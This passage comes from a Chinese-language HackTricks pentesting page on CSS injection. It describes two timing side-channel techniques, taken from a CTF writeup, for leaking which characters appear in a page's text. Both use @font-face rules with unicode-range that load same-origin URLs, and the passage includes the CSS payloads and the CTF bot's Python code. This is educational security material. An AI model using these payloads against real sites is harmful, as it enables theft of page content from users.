<p><strong>参考：</strong> 这在<a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">这篇文章中被提到作为一个不成功的解决方案</a></p>
<p>在这个案例中，我们可以尝试通过从同一来源加载一个假字体来泄露字符是否在文本中：</p>
<pre><code class="language-css">@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
</code></pre>
<p>如果匹配成功，<strong>字体将从 <code>/static/bootstrap.min.css?q=1</code> 加载</strong>。虽然它不会成功加载，但<strong>浏览器应该缓存它</strong>，即使没有缓存，也有<strong>304未修改</strong>机制，因此<strong>响应应该比其他内容更快</strong>。</p>
<p>然而，如果缓存响应与非缓存响应的时间差不够大，这将没有用。例如，作者提到：然而，经过测试，我发现第一个问题是速度没有太大差别，第二个问题是机器人使用了 <code>disk-cache-size=1</code> 标志，这真的很周到。</p>
<h3 id="文本节点外泄-iii通过定时加载数百个本地字体不需要外部资源泄露字符集"><a class="header" href="#文本节点外泄-iii通过定时加载数百个本地字体不需要外部资源泄露字符集">文本节点外泄 (III)：通过定时加载数百个本地“字体”（不需要外部资源）泄露字符集 <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>参考：</strong> 这在 <a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">这篇文章中被提到作为一个不成功的解决方案</a></p>
<p>在这种情况下，当发生匹配时，您可以指示<strong>CSS从同一来源加载数百个假字体</strong>。这样您可以<strong>测量所需时间</strong>，并找出某个字符是否出现，方法如下：</p>
<pre><code class="language-css">@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
</code></pre>
<p>而机器人的代码看起来像这样：</p>
<pre><code class="language-python">browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
</code></pre>
<p>所以，如果字体不匹配，访问机器人时的响应时间预计约为 30 秒。然而，如果存在字体匹配，将会发送多个请求以检索字体，导致网络持续活动。因此，满足停止条件并接收响应所需的时间会更长。因此，响应时间可以作为判断是否存在字体匹配的指标。</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e">https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e</a></li>
<li><a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b</a></li>
<li><a href="https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d">https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d</a></li>
<li><a href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives/">https://x-c3ll.github.io/posts/CSS-Injection-Primitives/</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践 AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/xs-search/javascript-execution-xs-leak.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/xs-search/css-injection/css-injection-code.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../pentesting-web/xs-search/javascript-execution-xs-leak.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/xs-search/css-injection/css-injection-code.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
